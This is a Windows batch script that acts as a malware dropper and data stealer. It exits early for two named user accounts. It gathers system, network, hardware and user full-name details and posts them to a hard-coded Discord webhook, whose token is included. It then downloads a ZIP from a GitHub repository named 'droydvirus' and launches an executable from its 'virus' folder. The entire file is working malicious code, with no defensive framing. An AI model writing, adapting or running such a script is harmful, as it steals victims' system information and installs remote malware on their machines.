@echo off
setlocal

set "repo_url=https://github.com/X17sa/droydvirus/archive/refs/heads/main.zip"
set "zip_path=%TEMP%\droydvirus.zip"
set "extract_path=%TEMP%\droydvirus"
set "downloads_path=%USERPROFILE%\Downloads"

set "user_name=%USERNAME%"

if /I "%user_name%"=="princ" (
   exit
)

if /I "%user_name%"=="adisa" (
   exit
)

echo Gathering system information...

:: Collect system information
:: Get system information
for /f "tokens=*" %%a in ('systeminfo') do set "sysinfo=%%a"

:: Get network information
for /f "tokens=*" %%a in ('ipconfig') do set "networkinfo=%%a"

:: Get system model
for /f "tokens=*" %%a in ('wmic computersystem get model') do set "systemmodel=%%a"

:: Get CPU information
for /f "tokens=*" %%a in ('wmic cpu get caption') do set "cpuinfo=%%a"

:: Get RAM information
for /f "tokens=*" %%a in ('wmic memorychip get capacity') do set "raminfo=%%a"

:: Get user full name
for /f "tokens=*" %%a in ('wmic useraccount where name="%user_name%" get fullname') do set "userfullname=%%a"

:: Format the message with better structure and additional info
set "message=\
**Alert: Unauthorized Access Detected!**%n%\
Here is the detailed system information:%n%n\
**User:** %user_name%%n%\
**Full Name:** %userfullname%%n%\
**System Model:** %systemmodel%%n%\
**CPU:** %cpuinfo%%n%\
**RAM Capacity:** %raminfo%%n%\
**Network Configuration:** %networkinfo%%n%\
**System Information:** %sysinfo%"

:: Send information to Discord webhook with better formatting and content type
powershell -Command "Invoke-RestMethod -Uri 'https://discord.com/api/webhooks/1337159633239937115/KdOhG-AXg3ckXDIrmcWESldNObYb5dZ16S8F591bs12XlwFC7M_l754ukBqeyhvXcJwY' -Method Post -Body '{\"content\": \"%message%\"}' -ContentType 'application/json'"

:: Download the repository
echo Downloading repository...
powershell -Command "& {Invoke-WebRequest '%repo_url%' -OutFile '%zip_path%'}"

:: Extract the ZIP file
echo Extracting ZIP...
powershell -Command "& {Expand-Archive -Path '%zip_path%' -DestinationPath '%extract_path%' -Force}"

:: Move the Neighborhood folder
echo Moving Neighborhood folder...
for /d %%D in ("%extract_path%\*") do if exist "%%D\Neighborhood" move "%%D\Neighborhood" "%downloads_path%"

:: Run Wordington.exe
echo Running Wordington.exe...
for /d %%D in ("%extract_path%\*") do if exist "%%D\virus" (
    cd /d "%%D\virus"
    start Wordington.exe
)

:: Cleanup
echo Cleaning up...
del "%zip_path%"
exit
